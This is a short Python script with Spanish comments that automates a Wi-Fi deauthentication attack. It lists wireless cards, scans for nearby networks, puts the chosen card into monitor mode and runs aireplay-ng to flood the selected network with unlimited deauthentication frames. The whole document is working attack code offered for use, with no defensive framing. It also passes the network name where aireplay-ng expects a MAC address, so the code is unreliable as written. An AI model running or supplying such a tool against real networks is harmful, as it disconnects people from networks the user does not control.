import subprocess

# Obtener lista de tarjetas de red disponibles
def obtener_tarjetas_red():
    resultado = subprocess.check_output(['iwconfig'])
    lineas = resultado.decode('utf-8').split('\n')
    tarjetas = []
    for linea in lineas:
        if 'IEEE' in linea:
            tarjetas.append(linea.split(' ')[0])
    return tarjetas

# Desautenticar una red específica
def desautenticar_red(tarjeta, red):
    subprocess.call(['ifconfig', tarjeta, 'down'])
    subprocess.call(['iwconfig', tarjeta, 'mode', 'monitor'])
    subprocess.call(['ifconfig', tarjeta, 'up'])
    subprocess.call(['aireplay-ng', '-0', '0', '-a', red, tarjeta])

# Mostrar lista de tarjetas de red disponibles
tarjetas_disponibles = obtener_tarjetas_red()
for i, tarjeta in enumerate(tarjetas_disponibles):
    print(f"{i+1}. {tarjeta}")

# Seleccionar tarjeta de red
opcion_tarjeta = int(input("Selecciona la tarjeta de red deseada: "))
tarjeta_seleccionada = tarjetas_disponibles[opcion_tarjeta-1]

# Obtener lista de redes disponibles en la tarjeta seleccionada
resultado = subprocess.check_output(['iwlist', tarjeta_seleccionada, 'scan'])
lineas = resultado.decode('utf-8').split('\n')
redes_disponibles = []
for linea in lineas:
    if 'ESSID' in linea:
        redes_disponibles.append(linea.split(':')[1].strip().replace('"', ''))

# Mostrar lista de redes disponibles
for i, red in enumerate(redes_disponibles):
    print(f"{i+1}. {red}")

# Seleccionar red a desautenticar
opcion_red = int(input("Selecciona la red a desautenticar: "))
red_seleccionada = redes_disponibles[opcion_red-1]

# Desautenticar la red seleccionada
desautenticar_red(tarjeta_seleccionada, red_seleccionada)
